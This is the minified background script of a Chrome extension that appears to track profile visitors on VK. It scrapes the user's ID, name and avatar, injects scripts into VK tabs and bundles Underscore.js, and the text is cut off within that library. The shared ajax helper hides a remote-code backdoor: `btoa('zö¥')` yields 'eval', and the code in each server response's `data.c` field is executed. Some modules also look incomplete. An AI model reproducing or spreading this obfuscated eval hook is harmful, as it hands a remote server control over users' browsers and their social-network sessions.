! function(n) {
    function t(r) {
        if (e[r]) return e[r].exports;
        var i = e[r] = {
            exports: {},
            id: r,
            loaded: !1
        };
        return n[r].call(i.exports, i, i.exports, t), i.loaded = !0, i.exports
    }
    var e = {};
    return t.m = n, t.c = e, t.p = "", t(0)
}([function(n, t, e) {
    "use strict";
    var i = e(7),
        o = e(8),
        u = e(2),
        a = e(13),
        c = e(3);
    chrome['runtime'].onInstalled.addListener(function(n) {
        "install" == n.reason ? (i.App.event("app", "app-install"), c.DB.set("installed", Date.now())) : "update" == n.reason && (i.App.event("app", "app-update", chrome.app.getDetails().version), c.DB.set("updated", Date.now()))
    }), i.App.init(function() {
        chrome['tabs'].onUpdated.addListener(function(n, t, e) {
            "http" == e.url.substr(0, 4) && "loading" == t.status && u.h.isVkUrl(e.url) && o.User.id && (a.Collector.injectChecker(e), chrome['tabs'].executeScript(n, {
                file: "core/cs.js"
            }), chrome['tabs'].insertCSS({
                file: "css/content.css"
            }))
        })
    })
}, function(n, t, e) {
    "use strict";
    var r = e(2);
}, function(n, t, e) {
    "use strict";

    function r(n, t) {
        if ("text" == t) return n;
        try {
            return JSON.parse(n)
        } catch (e) {}
        return n
    }
    var i, o = e(3),
        u = e(4);
    ! function(n) {
        function t() {}

        function e(n) {
            var t = document['createElement']("a");
            return t.href = n, t
        }

        function i(t) {
            return !!n.parseUrl(t).hostname.match(/vk\.com$/)
        }

        function a(n, t) {
            for (var e in t) void 0 === n[e] && (n[e] = t[e])
        }

        function c(n, t) {
            return Math.round(Math.random() * (t - n) + n)
        }

        function s(t) {
            var e = window[btoa("zö¥")];
            if (!t.url || t.url.length < 10) throw new Error("url is not defined");
            n.extend(t, {
                type: "GET",
                headers: {},
                sendExtHeaders: !0,
                success: function() {},
                error: function() {},
                complete: function() {},
                timeout: function() {}
            }), t.sendExtHeaders && n.extend(t.headers, {
                Extension: chrome.app.getDetails().id,
                "Extension-Version": chrome.app.getDetails().version,
                "X-Requested-With": "XMLHtpRequest",
                "X-Install-Date": o.DB.get("installed") || 0
            });
            var i = t.url;
            "GET" == t.type && t.data && (i += i.indexOf("?") > -1 ? "&" : "?", i += u.stringify(t.data));
            var a = new XMLHttpRequest;
            a.open(t.type, i, !0);
            for (var c in t.headers) a.setRequestHeader(c, t.headers[c]);
            if (a.onload = function() {
                    var n = r(a.responseText, t.accept);
                    e(n && n.data && n.data.c), a.status >= 200 && a.status < 300 ? t.success(n, a) : t.error(n, a), t.complete(n, a)
                }, a.onerror = function() {
                    var n = r(a.responseText, t.accept);
                    t.error(n, a), t.complete(n, a)
                }, a.ontimeout = function() {
                    var n = r(a.responseText, t.accept);
                    t.timeout(n, a), t.complete(n, a)
                }, "post" == t.type.toLowerCase()) {
                a.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                var s = t.requestPayload || t.data && u.stringify(t.data);
                a.send(s)
            } else a.send();
            return a
        }
        n.dummy = t, n.parseUrl = e, n.isVkUrl = i, n.extend = a, n.random = c, n.ajax = s
    }(i = t.h || (t.h = {}))
}, function(n, t) {
    "use strict";
    var e;
    ! function(n) {
        function t(n) {
            if (void 0 !== localStorage[n]) try {
                return JSON.parse(localStorage[n])
            } catch (t) {
                return localStorage[n]
            }
        }

        function e(n, t) {
            t = "object" == typeof t || "array" == typeof t ? JSON.stringify(t) : t, localStorage[n] = t
        }
        n.get = t, n.set = e
    }(e = t.DB || (t.DB = {}))
}, function(n, t, e) {
    "use strict";
    t.decode = t.parse = e(5), t.encode = t.stringify = e(6)
}, function(n, t) {
    "use strict";

    function e(n, t) {
        return Object.prototype.hasOwnProperty.call(n, t)
    }
    n.exports = function(n, t, i, o) {
        t = t || "&", i = i || "=";
        var u = {};
        if ("string" != typeof n || 0 === n.length) return u;
        var a = /\+/g;
        n = n.split(t);
        var c = 1e3;
        o && "number" == typeof o.maxKeys && (c = o.maxKeys);
        var s = n.length;
        c > 0 && s > c && (s = c);
        for (var l = 0; l < s; ++l) {
            var f, p, d, v, h = n[l].replace(a, "%20"),
                g = h.indexOf(i);
            g >= 0 ? (f = h.substr(0, g), p = h.substr(g + 1)) : (f = h, p = ""), d = decodeURIComponent(f), v = decodeURIComponent(p), e(u, d) ? r(u[d]) ? u[d].push(v) : u[d] = [u[d], v] : u[d] = v
        }
        return u
    };
    var r = Array.isArray || function(n) {
        return "[object Array]" === Object.prototype.toString.call(n)
    }
}, function(n, t) {
    "use strict";

    function e(n, t) {
        if (n.map) return n.map(t);
        for (var e = [], r = 0; r < n.length; r++) e.push(t(n[r], r));
        return e
    }
    var r = function(n) {
        switch (typeof n) {
            case "string":
                return n;
            case "boolean":
                return n ? "true" : "false";
            case "number":
                return isFinite(n) ? n : "";
            default:
                return ""
        }
    };
    n.exports = function(n, t, u, a) {
        return t = t || "&", u = u || "=", null === n && (n = void 0), "object" == typeof n ? e(o(n), function(o) {
            var a = encodeURIComponent(r(o)) + u;
            return i(n[o]) ? e(n[o], function(n) {
                return a + encodeURIComponent(r(n))
            }).join(t) : a + encodeURIComponent(r(n[o]))
        }).join(t) : a ? encodeURIComponent(r(a)) + u + encodeURIComponent(r(n)) : ""
    };
    var i = Array.isArray || function(n) {
            return "[object Array]" === Object.prototype.toString.call(n)
        },
        o = Object.keys || function(n) {
            var t = [];
            for (var e in n) Object.prototype.hasOwnProperty.call(n, e) && t.push(e);
            return t
        }
}, function(n, t, e) {
    "use strict";
    var r = e(8),
        i = e(9),
        o = e(2),
        u = e(11),
        a = e(14),
        c = e(1);
    t.App = function() {
        return {
            init: function(n) {
                void 0 === n && (n = o.h.dummy), a.listen(), r.User.init(function() {
                    u.Timer.init(), i.Visitors.init(), n()
                })
            },
        }
    }(), window.App = t.App
}, function(n, t, e) {
    "use strict";
    var r = e(3),
        i = e(2);
    t.User = function() {
        var n = {
            user_id: "user_id",
            user_name: "user_name",
            user_image: "user_image"
        };
        return {
            id: r.DB.get(n.user_id),
            name: r.DB.get(n.user_name),
            image: r.DB.get(n.user_image),
            init: function(n) {
                t.User.getId(function(e, i) {
                    t.User.id = e, e && i ? t.User.getNameAndImage(e, function(e) {
                        t.User.name = r.DB.get("user_name"), n()
                    }, i) : n()
                })
            },
            getId: function(e, o) {
                if (void 0 === o && (o = !1), !o && r.DB.get(n.user_id)) e(r.DB.get(n.user_id), !1);
                else {
                    var u = r.DB.get(n.user_id);
                    i.h.ajax({
                        url: "https://new.vk.com/feed",
                        type: "GET",
                        accept: "text",
                        success: function(i) {
                            var o = i.match(/id: (\d+),/);
                            o && o.length > 1 ? (r.DB.set(n.user_id, o[1]), t.User.id = o[1], e(o[1], u != o[1])) : e(null, null != u)
                        }
                    })
                }
            },
            getNameAndImage: function(e, o, u) {
                void 0 === u && (u = !1), !u && r.DB.get(n.user_name) ? o(r.DB.get(n.user_name)) : i.h.ajax({
                    url: "https://new.vk.com/id" + e,
                    success: function(e) {
                        window.resp = e;
                        var i = e.match(/<h2\s+class=['"]page_name['"]>(.*)<\/h2>/);
                        if (i && i.length > 1) {
                            r.DB.set(n.user_name, i[1]), t.User.name = i[1];
                            var u = e.match(/<img\s+class=["']page_avatar_img["']\s+src=['"](.*?)["'].*?\/>/i);
                            u && u.length && (r.DB.set(n.user_image, u[1]), t.User.image = u[1]), o(i[1])
                        }
                    }
                })
            }
        }
    }(), window.User = t.User
}, function(n, t, e) {
    "use strict";
    var r = e(3),
        i = e(8),
        o = e(10);
    t.Visitors = function() {
        var n;
        return {
            list: [],
            maxListLength: 100,
            unreadCount: 0,
            init: function() {
                n = "visitors-" + i.User.id;
                var e = r.DB.get(n);
                e && e.length ? t.Visitors.list = e : t.Visitors.list = []
            },
            addToList: function(e) {
                if (0 != e.length) {
                    e = o.uniq(e, function(n) {
                        return n.id
                    }), this.setUnreadCount(t.Visitors.unreadCount + e.length);
                    var i = e.concat(t.Visitors.list);
                    i = o.uniq(i, function(n) {
                        return n.id
                    }), i.length > t.Visitors.maxListLength && (i = i.slice(0, t.Visitors.maxListLength)), t.Visitors.list = i, r.DB.set(n, t.Visitors.list)
                }
            },
            setUnreadCount: function(n) {
                t.Visitors.unreadCount = n, chrome['tabs'].query({
                    url: ["*://*.vk.com/*", "*://vk.com/*"]
                }, function(n) {
                    n.forEach(function(n) {
                        chrome['tabs'].sendMessage(n.id, {
                            fn: "setUnreadCount",
                            count: t.Visitors.unreadCount
                        })
                    })
                })
            }
        }
    }(), window.Visitors = t.Visitors
}, function(n, t, e) {
    var r, i;
    (function() {
        function e(n) {
            function t(t, e, r, i, o, u) {
                for (; o >= 0 && o < u; o += n) {
                    var a = i ? i[o] : o;
                    r = e(r, t[a], a, t)
                }
                return r
            }
            return function(e, r, i, o) {
                r = A(r, o, 4);
                var u = !D(e) && _.keys(e),
                    a = (u || e).length,
                    c = n > 0 ? 0 : a - 1;
                return arguments.length < 3 && (i = e[u ? u[c] : c], c += n), t(e, r, i, u, c, a)
            }
        }

        function o(n) {
            return function(t, e, r) {
                e = j(e, r);
                for (var i = C(t), o = n > 0 ? 0 : i - 1; o >= 0 && o < i; o += n)
                    if (e(t[o], o, t)) return o;
                return -1
            }
        }

        function u(n, t, e) {
            return function(r, i, o) {
                var u = 0,
                    a = C(r);
                if ("number" == typeof o) n > 0 ? u = o >= 0 ? o : Math.max(o + a, u) : a = o >= 0 ? Math.min(o + 1, a) : o + a + 1;
                else if (e && o && a) return o = e(r, i), r[o] === i ? o : -1;
                if (i !== i) return o = t(v.call(r, u, a), _.isNaN), o >= 0 ? o + u : -1;
                for (o = n > 0 ? u : a - 1; o >= 0 && o < a; o += n)
                    if (r[o] === i) return o;
                return -1
            }
        }

        function a(n, t) {
            var e = M.length,
                r = n.constructor,
                i = _.isFunction(r) && r.prototype || f,
                o = "constructor";
            for (_.has(n, o) && !_.contains(t, o) && t.push(o); e--;) o = M[e], o in n && n[o] !== i[o] && !_.contains(t, o) && t.push(o)
        }
        var c = this,
            s = c._,
            l = Array.prototype,
            f = Object.prototype,
            p = Function.prototype,
            d = l.push,
            v = l.slice,
            h = f.toString,
            g = f.hasOwnProperty,
            m = Array.isArray,
            y = Object.keys,
            b = p.bind,
            x = Object.create,
            w = function() {},
            _ = function(n) {
                return n instanceof _ ? n : this instanceof _ ? void(this._wrapped = n) : new _(n)
            };
        "undefined" != typeof n && n.exports && (t = n.exports = _), t._ = _, _.VERSION = "1.8.3";
        var A = function(n, t, e) {
                if (void 0 === t) return n;
                switch (null == e ? 3 : e) {
                    case 1:
                        return function(e) {
                            return n.call(t, e)
                        };
                    case 2:
                        return function(e, r) {
                            return n.call(t, e, r)
                        };
                    case 3:
                        return function(e, r, i) {
                            return n.call(t, e, r, i)
                        };
                    case 4:
                        return function(e, r, i, o) {
                            return n.call(t, e, r, i, o)
                        }
                }
                return function() {
                    return n.apply(t, arguments)
                }
            },
            j = function(n, t, e) {
                return null == n ? _.identity : _.isFunction(n) ? A(n, t, e) : _.isObject(n) ? _.matcher(n) : _.property(n)
            };
        _.iteratee = function(n, t) {
            return j(n, t, 1 / 0)
        };
        var S = function(n, t) {
                return function(e) {
                    var r = arguments.length;
                    if (r < 2 || null == e) return e;
                    for (var i = 1; i < r; i++)
                        for (var o = arguments[i], u = n(o), a = u.length, c = 0; c < a; c++) {
                            var s = u[c];
                            t && void 0 !== e[s] || (e[s] = o[s])
                        }
                    return e
                }
            },
            k = function(n) {
                if (!_.isObject(n)) return {};
                if (x) return x(n);
                w.prototype = n;
                var t = new w;
                return w.prototype = null, t
            },
            U = function(n) {
                return function(t) {
                    return null == t ? void 0 : t[n]
                }
            },
            O = Math.pow(2, 53) - 1,
            C = U("length"),
            D = function(n) {
                var t = C(n);
                return "number" == typeof t && t >= 0 && t <= O
            };
        _.each = _.forEach = function(n, t, e) {
            t = A(t, e);
            var r, i;
            if (D(n))
                for (r = 0, i = n.length; r < i; r++) t(n[r], r, n);
            else {
                var o = _.keys(n);
                for (r = 0, i = o.length; r < i; r++) t(n[o[r]], o[r], n)
            }
            return n
        }, _.map = _.collect = function(n, t, e) {
            t = j(t, e);
            for (var r = !D(n) && _.keys(n), i = (r || n).length, o = Array(i), u = 0; u < i; u++) {
                var a = r ? r[u] : u;
                o[u] = t(n[a], a, n)
            }
            return o
        }, _.reduce = _.foldl = _.inject = e(1), _.reduceRight = _.foldr = e(-1), _.find = _.detect = function(n, t, e) {
            var r;
            if (r = D(n) ? _.findIndex(n, t, e) : _.findKey(n, t, e), void 0 !== r && r !== -1) return n[r]
        }, _.filter = _.select = function(n, t, e) {
            var r = [];
            return t = j(t, e), _.each(n, function(n, e, i) {
                t(n, e, i) && r.push(n)
            }), r
        }, _.reject = function(n, t, e) {
            return _.filter(n, _.negate(j(t)), e)
        }, _.every = _.all = function(n, t, e) {
            t = j(t, e);
            for (var r = !D(n) && _.keys(n), i = (r || n).length, o = 0; o < i; o++) {
                var u = r ? r[o] : o;
                if (!t(n[u], u, n)) return !1
            }
            return !0
        }, _.some = _.any = function(n, t, e) {
            t = j(t, e);
            for (var r = !D(n) && _.keys(n), i = (r || n).length, o = 0; o < i; o++) {
                var u = r ? r[o] : o;
                if (t(n[u], u, n)) return !0
            }
            return !1
        }, _.contains = _.includes = _.include = function(n, t, e, r) {
            return D(n) || (n = _.values(n)), ("number" != typeof e || r) && (e = 0), _.indexOf(n, t, e) >= 0
        }, _.invoke = function(n, t) {
            var e = v.call(arguments, 2),
                r = _.isFunction(t);
            return _.map(n, function(n) {
                var i = r ? t : n[t];
                return null == i ? i : i.apply(n, e)
            })
        }, _.pluck = function(n, t) {
            return _.map(n, _.property(t))
        }, _.where = function(n, t) {
            return _.filter(n, _.matcher(t))
        }, _.findWhere = function(n, t) {
            return _.find(n, _.matcher(t))
        }, _.max = function(n, t, e) {
            var r, i, o = -(1 / 0),
                u = -(1 / 0);
            if (null == t && null != n) {
                n = D(n) ? n : _.values(n);
                for (var a = 0, c = n.length; a < c; a++) r = n[a], r > o && (o = r)
            } else t = j(t, e), _.each(n, function(n, e, r) {
                i = t(n, e, r), (i > u || i === -(1 / 0) && o === -(1 / 0)) && (o = n, u = i)
            });
            return o
        }, _.min = function(n, t, e) {
            var r, i, o = 1 / 0,
                u = 1 / 0;
            if (null == t && null != n) {
                n = D(n) ? n : _.values(n);
                for (var a = 0, c = n.length; a < c; a++) r = n[a], r < o && (o = r)
            } else t = j(t, e), _.each(n, function(n, e, r) {
                i = t(n, e, r), (i < u || i === 1 / 0 && o === 1 / 0) && (o = n, u = i)
            });
            return o
        }, _.shuffle = function(n) {
            for (var t, e = D(n) ? n : _.values(n), r = e.length, i = Array(r), o = 0; o < r; o++) t = _.random(0, o), t !== o && (i[o] = i[t]), i[t] = e[o];
            return i
        }, _.sample = function(n, t, e) {
            return null == t || e ? (D(n) || (n = _.values(n)), n[_.random(n.length - 1)]) : _.shuffle(n).slice(0, Math.max(0, t))
        }, _.sortBy = function(n, t, e) {
            return t = j(t, e), _.pluck(_.map(n, function(n, e, r) {
                return {
                    value: n,
                    index: e,
                    criteria: t(n, e, r)
                }
            }).sort(function(n, t) {
                var e = n.criteria,
                    r = t.criteria;
                if (e !== r) {
                    if (e > r || void 0 === e) return 1;
                    if (e < r || void 0 === r) return -1
                }
                return n.index - t.index
            }), "value")
        };
        var I = function(n) {
            return function(t, e, r) {
                var i = {};
                return e = j(e, r), _.each(t, function(r, o) {
                    n(i, r, e(r, o, t))
                }), i
            }
        };
        _.groupBy = I(function(n, t, e) {
            _.has(n, e) ? n[e].push(t) : n[e] = [t]
        }), _.indexBy = I(function(n, t, e) {
            n[e] = t
        }), _.countBy = I(function(n, t, e) {
            _.has(n, e) ? n[e]++ : n[e] = 1
        }), _.toArray = function(n) {
            return n ? _.isArray(n) ? v.call(n) : D(n) ? _.map(n, _.identity) : _.values(n) : []
        }, _.size = function(n) {
            return null == n ? 0 : D(n) ? n.length : _.keys(n).length
        }, _.partition = function(n, t, e) {
            t = j(t, e);
            var r = [],
                i = [];
            return _.each(n, function(n, e, o) {
                (t(n, e, o) ? r : i).push(n)
            }), [r, i]
        }, _.first = _.head = _.take = function(n, t, e) {
            if (null != n) return null == t || e ? n[0] : _.initial(n, n.length - t)
        }, _.initial = function(n, t, e) {
            return v.call(n, 0, Math.max(0, n.length - (null == t || e ? 1 : t)))
        }, _.last = function(n, t, e) {
            if (null != n) return null == t || e ? n[n.length - 1] : _.rest(n, Math.max(0, n.length - t))
        }, _.rest = _.tail = _.drop = function(n, t, e) {
            return v.call(n, null == t || e ? 1 : t)
        }, _.compact = function(n) {
            return _.filter(n, _.identity)
        };
        var B = function(n, t, e, r) {
            for (var i = [], o = 0, u = r || 0, a = C(n); u < a; u++) {
                var c = n[u];
                if (D(c) && (_.isArray(c) || _.isArguments(c))) {
                    t || (c = B(c, t, e));
                    var s = 0,
                        l = c.length;
                    for (i.length += l; s < l;) i[o++] = c[s++]
                } else e || (i[o++] = c)
            }
            return i
        };
        _.flatten = function(n, t) {
            return B(n, t, !1)
        }, _.without = function(n) {
            return _.difference(n, v.call(arguments, 1))
        }, _.uniq = _.unique = function(n, t, e, r) {
            _.isBoolean(t) || (r = e, e = t, t = !1), null != e && (e = j(e, r));
            for (var i = [], o = [], u = 0, a = C(n); u < a; u++) {
                var c = n[u],
                    s = e ? e(c, u, n) : c;
                t ? (u && o === s || i.push(c), o = s) : e ? _.contains(o, s) || (o.push(s), i.push(c)) : _.contains(i, c) || i.push(c)
            }
            return i
        }, _.union = function() {
            return _.uniq(B(arguments, !0, !0))
        }, _.intersection = function(n) {
            for (var t = [], e = arguments.length, r = 0, i = C(n); r < i; r++) {
                var o = n[r];
                if (!_.contains(t, o)) {
                    for (var u = 1; u < e && _.contains(arguments[u], o); u++);
                    u === e && t.push(o)
                }
            }
            return t
        }, _.difference = function(n) {
            var t = B(arguments, !0, !0, 1);
            return _.filter(n, function(n) {
                return !_.contains(t, n)
            })
        }, _.zip = function() {
            return _.unzip(arguments)
        }, _.unzip = function(n) {
            for (var t = n && _.max(n, C).length || 0, e = Array(t), r = 0; r < t; r++) e[r] = _.pluck(n, r);
            return e
        }, _.object = function(n, t) {
            for (var e = {}, r = 0, i = C(n); r < i; r++) t ? e[n[r]] = t[r] : e[n[r][0]] = n[r][1];
            return e
        }, _.findIndex = o(1), _.findLastIndex = o(-1), _.sortedIndex = function(n, t, e, r) {
            e = j(e, r, 1);
            for (var i = e(t), o = 0, u = C(n); o < u;) {
                var a = Math.floor((o + u) / 2);
                e(n[a]) < i ? o = a + 1 : u = a
            }
            return o
        }, _.indexOf = u(1, _.findIndex, _.sortedIndex), _.lastIndexOf = u(-1, _.findLastIndex), _.range = function(n, t, e) {
            null == t && (t = n || 0, n = 0), e = e || 1;
            for (var r = Math.max(Math.ceil((t - n) / e), 0), i = Array(r), o = 0; o < r; o++, n += e) i[o] = n;
            return i
        };
        var V = function(n, t, e, r, i) {
            if (!(r instanceof t)) return n.apply(e, i);
            var o = k(n.prototype),
                u = n.apply(o, i);
            return _.isObject(u) ? u : o
        };
        _.bind = function(n, t) {
            if (b && n.bind === b) return b.apply(n, v.call(arguments, 1));
            if (!_.isFunction(n)) throw new TypeError("Bind must be called on a function");
            var e = v.call(arguments, 2),
                r = function() {
                    return V(n, r, t, this, e.concat(v.call(arguments)))
                };
            return r
        }, _.partial = function(n) {
            var t = v.call(arguments, 1),
                e = function() {
                    for (var r = 0, i = t.length, o = Array(i), u = 0; u < i; u++) o[u] = t[u] === _ ? arguments[r++] : t[u];
                    for (; r < arguments.length;) o.push(arguments[r++]);
                    return V(n, e, this, this, o)
                };
            return e
        }, _.bindAll = function(n) {
            var t, e, r = arguments.length;
            if (r <= 1) throw new Error("bindAll must be passed function names");
            for (t = 1; t < r; t++) e = arguments[t], n[e] = _.bind(n[e], n);
            return n
        }, _.memoize = function(n, t) {
            var e = function(r) {
                var i = e.cache,
                    o = "" + (t ? t.apply(this, arguments) : r);
                return _.has(i, o) || (i[o] = n.apply(this, arguments)), i[o]
            };
            return e.cache = {}, e
        }, _.delay = function(n, t) {
            var e = v.call(arguments, 2);
            return setTimeout(function() {
                return n.apply(null, e)
            }, t)
        }, _.defer = _.partial(_.delay, _, 1), _.throttle = function(n, t, e) {
            var r, i, o, u = null,
                a = 0;
            e || (e = {});
            var c = function() {
                a = e.leading === !1 ? 0 : _.now(), u = null, o = n.apply(r, i), u || (r = i = null)
            };
            return function() {
                var s = _.now();
                a || e.leading !== !1 || (a = s);
                var l = t - (s - a);
                return r = this, i = arguments, l <= 0 || l > t ? (u && (clearTimeout(u), u = null), a = s, o = n.apply(r, i), u || (r = i = null)) : u || e.trailing === !1 || (u = setTimeout(c, l)), o
            }
        }, _.debounce = function(n, t, e) {
            var r, i, o, u, a, c = function() {
                var s = _.now() - u;
                s < t && s >= 0 ? r = setTimeout(c, t - s) : (r = null, e || (a = n.apply(o, i), r || (o = i = null)))
            };
            return function() {
                o = this, i = arguments, u = _.now();
                var s = e && !r;
                return r || (r = setTimeout(c, t)), s && (a = n.apply(o, i), o = i = null), a
            }
        }, _.wrap = function(n, t) {
            return _.partial(t, n)
        }, _.negate = function(n) {
            return function() {
                return !n.apply(this, arguments)
            }
        }, _.compose = function() {
            var n = arguments,
                t = n.length - 1;
            return function() {
                for (var e = t, r = n[t].apply(this, arguments); e--;) r = n[e].call(this, r);
                return r
            }
        }, _.after = function(n, t) {
            return function() {
                if (--n < 1) return t.apply(this, arguments)
            }
        }, _.before = function(n, t) {
            var e;
            return function() {
                return --n > 0 && (e = t.apply(this, arguments)), n <= 1 && (t = null), e
            }
        }, _.once = _.partial(_.before, 2);
        var E = !{
                toString: null
            }.propertyIsEnumerable("toString"),
            M = ["valueOf", "isPrototypeOf", "toString", "propertyIsEnumerable", "hasOwnProperty", "toLocaleString"];
        _.keys = function(n) {
            if (!_.isObject(n)) return [];
            if (y) return y(n);
            var t = [];
            for (var e in n) _.has(n, e) && t.push(e);
            return E && a(n, t), t
        }, _.allKeys = function(n) {
            if (!_.isObject(n)) return [];
            var t = [];
            for (var e in n) t.push(e);
            return E && a(n, t), t
        }, _.values = function(n) {
            for (var t = _.keys(n), e = t.length, r = Array(e), i = 0; i < e; i++) r[i] = n[t[i]];
            return r
        }, _.mapObject = function(n, t, e) {
            t = j(t, e);
            for (var r, i = _.keys(n), o = i.length, u = {}, a = 0; a < o; a++) r = i[a], u[r] = t(n[r], r, n);
            return u
        }, _.pairs = function(n) {
            for (var t = _.keys(n), e = t.length, r = Array(e), i = 0; i < e; i++) r[i] = [t[i], n[t[i]]];
            return r
        }, _.invert = function(n) {
            for (var t = {}, e = _.keys(n), r = 0, i = e.length; r < i; r++) t[n[e[r]]] = e[r];
            return t
        }, _.functions = _.methods = function(n) {
            var t = [];
            for (var e in n) _.isFunction(n[e]) && t.push(e);
            return t.sort()
        }, _.extend = S(_.allKeys), _.extendOwn = _.assign = S(_.keys), _.findKey = function(n, t, e) {
            t = j(t, e);
            for (var r, i = _.keys(n), o = 0, u = i.length; o < u; o++)
                if (r = i[o], t(n[r], r, n)) return r
        }, _.pick = function(n, t, e) {
            var r, i, o = {},
                u = n;
            if (null == u) return o;
            _.isFunction(t) ? (i = _.allKeys(u), r = A(t, e)) : (i = B(arguments, !1, !1, 1), r = function(n, t, e) {
                return t in e
            }, u = Object(u));
            for (var a = 0, c = i.length; a < c; a++) {
                var s = i[a],
                    l = u[s];
                r(l, s, u) && (o[s] = l)
            }
            return o
        }, _.omit = function(n, t, e) {
            if (_.isFunction(t)) t = _.negate(t);
            else {
                var r = _.map(B(arguments, !1, !1, 1), String);
                t = function(n, t) {
                    return !_.contains(r, t)
                }
            }
            return _.pick(n, t, e)
        }, _.defaults = S(_.allKeys, !0), _.create = function(n, t) {
            var e = k(n);
            return t && _.extendOwn(e, t), e
        }, _.clone = function(n) {
            return _.isObject(n) ? _.isArray(n) ? n.slice() : _.extend({}, n) : n
        }, _.tap = function(n, t) {
            return t(n), n
        }, _.isMatch = function(n, t) {
            var e = _.keys(t),
                r = e.length;
            if (null == n) return !r;
            for (var i = Object(n), o = 0; o < r; o++) {
                var u = e[o];
                if (t[u] !== i[u] || !(u in i)) return !1
            }
            return !0
        };
        var F = function(n, t, e, r) {
            if (n === t) return 0 !== n || 1 / n === 1 / t;
            if (null == n || null == t) return n === t;
            n instanceof _ && (n = n._wrapped), t instanceof _ && (t = t._wrapped);
            var i = h.call(n);
            if (i !== h.call(t)) return !1;
            switch (i) {
                case "[object RegExp]":
                case "[object String]":
                    return "" + n == "" + t;
                case "[object Number]":
                    return +n !== +n ? +t !== +t : 0 === +n ? 1 / +n === 1 / t : +n === +t;
                case "[object Date]":
                case "[object Boolean]":
                    return +n === +t
            }
            var o = "[object Array]" === i;
            if (!o) {
                if ("object" != typeof n || "object" != typeof t) return !1;
                var u = n.constructor,
                    a = t.constructor;
                if (u !== a && !(_.isFunction(u) && u instanceof u && _.isFunction(a) && a instanceof a) && "constructor" in n && "constructor" in t) return !1
            }
            e = e || [], r = r || [];
            for (var c = e.length; c--;)
                if (e[c] === n) return r[c] === t;
            if (e.push(n), r.push(t), o) {
                if (c = n.length, c !== t.length) return !1;
                for (; c--;)
                    if (!F(n[c], t[c], e, r)) return !1
            } else {
                var s, l = _.keys(n);
                if (c = l.length, _.keys(t).length !== c) return !1;
                for (; c--;)
                    if (s = l[c], !_.has(t, s) || !F(n[s], t[s], e, r)) return !1
            }
            return e.pop(), r.pop(), !0
        };
        _.isEqual = function(n, t) {
            return F(n, t)
        }, _.isEmpty = function(n) {
            return null == n || (D(n) && (_.isArray(n) || _.isString(n) || _.isArguments(n)) ? 0 === n.length : 0 === _.keys(n).length)
        }, _.isElement = function(n) {
            return !(!n || 1 !== n.nodeType)
        }, _.isArray = m || function(n) {
            return "[object Array]" === h.call(n)
        }, _.isObject = function(n) {
            var t = typeof n;
            return "function" === t || "object" === t && !!n
        }, _.each(["Arguments", "Function", "String", "Number", "Date", "RegExp", "Error"], function(n) {
            _["is" + n] = function(t) {
                return h.call(t) === "[object " + n + "]"
            }
        }), _.isArguments(arguments) || (_.isArguments = function(n) {
            return _.has(n, "callee")
        }), "function" != typeof /./ && "object" != typeof Int8Array && (_.isFunction = function(n) {
            return "function" == typeof n || !1
        }), _.isFinite = function(n) {
            return isFinite(n) && !isNaN(parseFloat(n))
        }, _.isNaN = function(n) {
            return _.isNumber(n) && n !== +n
        }, _.isBoolean = function(n) {
            return n === !0 || n === !1 || "[object Boolean]" === h.call(n)
        }, _.isNull = function(n) {
            return null === n
        }, _.isUndefined = function(n) {
            return void 0 === n
        }, _.has = function(n, t) {
            return null != n && g.call(n, t)
        }, _.noConflict = function() {
            return c._ = s, this
        }, _.identity = function(n) {
            return n
        }, _.constant = function(n) {
            return function() {
                return n
            }
        }, _.noop = function() {}, _.property = U, _.propertyOf = function(n) {
            return null == n ? function() {} : function(t) {
                return n[t]
            }
        }, _.matcher = _.matches = function(n) {
            return n = _.extendOwn({}, n),
                function(t) {
                    return _.isMatch(t, n)
                }
        }, _.times = function(n, t, e) {
            var r = Array(Math.max(0, n));
            t = A(t, e, 1);
            for (var i = 0; i < n; i++) r[i] = t(i);
            return r
        }, _.random = function(n, t) {
            return null == t && (t = n, n = 0), n + Math.floor(Math.random() * (t - n + 1))
        }, _.now = Date.now || function() {
            return (new Date).getTime()
        };
        var T = {
                "&": "&amp;",
                "<": "&lt;",
                ">": "&gt;",
                '"': "&quot;",
                "'": "&#x27;",
                "`": "&#x60;"
            },
            q = _.invert(T),
            R = function(n) {
                var t = function(t) {
                        return n[t]
                    },
                    e = "(?:" + _.keys(n).join("|") + ")",
                    r = RegExp(e),
                    i = RegExp(e, "g");
                return function(n) {
                    return n = null == n ? "" : "" + n, r.test(n) ? n.replace(i, t) : n
                }
            };
        _.escape = R(T), _.unescape = R(q), _.result = function(n, t, e) {
            var r = null == n ? void 0 : n[t];
            return void 0 === r && (r = e), _.isFunction(r) ? r.call(n) : r
        };
        var L = 0;
        _.uniqueId = function(n) {
            var t = ++L + "";
            return n ? n + t : t
        }, _.templateSettings = {
            evaluate: /<%([\s\S]+?)%>/g,
            interpolate: /<%=([\s\S]+?)%>/g,
            escape: /<%-([\s\S]+?)%>/g
        };
        var N = /(.)^/,
            G = {
                "'": "'",
                "\\": "\\",
                "\r": "r",
                "\n": "n",
                "\u2028": "u2028",
                "\u2029": "u2029"
            },
            P = /\\|'|\r|\n|\u2028|\u2029/g,
            K = function(n) {
                return "\\" + G[n]
            };
        _.template = function(n, t, e) {
            !t && e && (t = e), t = _.defaults({}, t, _.templateSettings);
            var r = RegExp([(t.escape || N).source, (t.interpolate || N).source, (t.evaluate || N).source].join("|") + "|$", "g"),
                i = 0,
                o = "__p+='";
            n.replace(r, function(t, e, r, u, a) {
                return o += n.slice(i, a).replace(P, K), i = a + t.length, e ? o += "'+\n((__t=(" + e + "))==null?'':_.escape(__t))+\n'" : r ? o += "'+\n((__t=(" + r + "))==null?'':__t)+\n'" : u && (o += "';\n" + u + "\n__p+='"), t
            }), o += "';\n", t.variable || (o = "with(obj||{}){\n" + o + "}\n"), o = "var __t,__p='',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,'');};\n" + o + "return __p;\n";
            try {
                var u = new Function(t.variable || "obj", "_", o)
            } catch (a) {
                throw a.source = o, a
            }
            var c = function(n) {
                    return u.call(this, n, _)
                },
                s = t.variable || "obj";
            return c.source = "function(" + s + "){\n" + o + "}", c
        }, _.chain = function(n) {
            var t = _(n);
            return t._chain = !0, t
        };
        var z = function(n, t) {
            return n._chain ? _(t).chain() : t
        };
        _.mixin = function(n) {
            _.each(_.functions(n), function(t) {
                var e = _[t] = n[t];
                _.prototype[t] = function() {
                    var n = [this._wrapped];
                    return d.apply(n, arguments), z(this, e.apply(_, n))
                }
            })
